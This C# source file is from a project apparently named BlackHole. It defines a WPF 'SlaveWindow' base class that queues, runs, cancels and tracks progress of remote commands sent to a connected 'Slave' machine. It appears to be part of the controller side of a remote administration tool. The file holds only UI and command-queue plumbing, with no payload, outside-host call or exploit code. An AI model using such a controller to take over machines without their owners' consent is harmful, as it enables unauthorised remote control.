using BlackHole.Common;
using BlackHole.Common.Network.Protocol;
using BlackHole.Master.Model;
using BlackHole.Master.Remote;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Media;

namespace BlackHole.Master
{
    public class SlaveWindow : Window, IEventListener<SlaveEvent, Slave>
    {
        /// <summary>
        /// 
        /// </summary>
        public Slave Slave
        {
            get;
        }

        /// <summary>
        /// 
        /// </summary>
        public ViewModelCollection<IRemoteCommand> ViewModelCommands
        {
            get;
            private set;
        }

        /// <summary>
        /// 
        /// </summary>
        protected Queue<IRemoteCommand> m_pendingCommands;

        /// <summary>
        /// 
        /// </summary>
        protected IRemoteCommand m_currentCommand;

        /// <summary>
        /// 
        /// </summary>
        /// <param name="slave"></param>
        public SlaveWindow(Slave slave) : this()
        {
            Slave = slave;
            m_pendingCommands = new Queue<IRemoteCommand>();
            ViewModelCommands = new ViewModelCollection<IRemoteCommand>();            
        }

        /// <summary>
        /// 
        /// </summary>
        public SlaveWindow()
        {
        }

        /// <summary>
        /// 
        /// </summary>
        /// <typeparam name="T"></typeparam>
        /// <param name="objects"></param>
        /// <param name="action"></param>
        protected void ExecuteOnSelectedItems<T>(ListView listView, Action<T> action)
        {
            if (listView.SelectedItems.Count == 0)
                return;

            foreach (var item in listView.SelectedItems.OfType<T>().ToArray())
                action(item);
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="command"></param>
        protected void AddCommand(IRemoteCommand command)
        {
            m_pendingCommands.Enqueue(command);
            ViewModelCommands.Items.Add(command);
            ExecuteNextCommandIfPossible();
        }

        /// <summary>
        /// 
        /// </summary>
        protected void FinishCurrentCommand()
        {
            var temp = m_currentCommand;
            // we delay the remove so we see small file downloads, otherwise it would be dropped instantly (download too fast)
            Dispatcher.DelayInvoke(TimeSpan.FromMilliseconds(2000), () =>
            {
                ViewModelCommands.Items.Remove(temp);
            });
            m_currentCommand = null;
            ExecuteNextCommandIfPossible();
        }

        /// <summary>
        /// 
        /// </summary>
        protected void ExecuteNextCommandIfPossible()
        {
            if (m_currentCommand != null)
                return;

            if (m_pendingCommands.Count == 0)
                return;

            m_currentCommand = m_pendingCommands.Dequeue();
            if (IsCommandCancelled(m_currentCommand.Id))
            {
                m_currentCommand = null;
                ExecuteNextCommandIfPossible();
            }
            else
            {
                m_currentCommand.DoExecute();
            }
        }

        /// <summary>
        /// 
        /// </summary>
        /// <typeparam name="TIn"></typeparam>
        /// <returns></returns>
        protected RemoteCommand<TIn> GetCommmandAs<TIn>() => m_currentCommand as RemoteCommand<TIn>;

        /// <summary>
        /// 
        /// </summary>
        /// <typeparam name="TIn"></typeparam>
        /// <param name="input"></param>
        /// <param name="onContinue"></param>
        /// <param name="onCompleted"></param>
        /// <param name="onCancelled"></param>
        protected void UpdateCommand<TIn>(TIn input, Action<RemoteCommand<TIn>> onUpdate)
        {
            var command = GetCommmandAs<TIn>();
            if (command == null || IsCommandCancelled(command.Id))
            {
                FinishCurrentCommand();
                return;
            }

            onUpdate(command);

            if (!command.Completed)
                command.DoContinue(input);
            else
                command.DoComplete(input);
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="id"></param>
        protected void CancelCommand(long id)
        {
            if (!IsCommandCancelled(id))
                ViewModelCommands.Items.Remove(ViewModelCommands.Items.First(command => command.Id == id));
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="id"></param>
        /// <returns></returns>
        protected bool IsCommandCancelled(long id) => !ViewModelCommands.Items.Any(command => command.Id == id);

        /// <summary>
        /// 
        /// </summary>
        /// <param name="operationId"></param>
        /// <param name="operation"></param>
        /// <param name="message"></param>
        protected void FireSuccessStatus(long operationId, string operation, string message) =>
            FireFakeStatus(operationId, operation, true, message);

        /// <summary>
        /// 
        /// </summary>
        /// <param name="operationId"></param>
        /// <param name="operation"></param>
        /// <param name="message"></param>
        protected void FireFailedStatus(long operationId, string operation, string message) =>
            FireFakeStatus(operationId, operation, false, message);

        /// <summary>
        /// 
        /// </summary>
        /// <param name="operationId"></param>
        /// <param name="operation"></param>
        /// <param name="success"></param>
        /// <param name="message"></param>
        protected void FireFakeStatus(long operationId, string operation, bool success, string message) =>
            Slave.SlaveEvents.PostEvent(new SlaveEvent(SlaveEventType.INCOMMING_MESSAGE, Slave, new StatusUpdateMessage()
            {
                OperationId = operationId,
                Operation = operation,
                Message = message,
                Success = success
            }));

        /// <summary>
        /// 
        /// </summary>
        /// <param name="ev"></param>
        /// <returns></returns>
        public virtual async void OnEvent(SlaveEvent ev)
        {
            await this.ExecuteInDispatcher(() =>
            {
                switch ((SlaveEventType)ev.EventType)
                {
                    case SlaveEventType.INCOMMING_MESSAGE:
                        ev.Data
                            .Match()
                            .With<StatusUpdateMessage>(m =>
                            {
                                if ((m_currentCommand != null) && (m.OperationId == m_currentCommand.Id) && !m.Success)
                                {
                                    m_currentCommand.ProgressColor = Brushes.DarkRed;
                                    m_currentCommand.UpdateProgression(0, 0);
                                    m_currentCommand.DoFault();
                                }    
                            });
                        break;
                }
            });
        }
    }
}
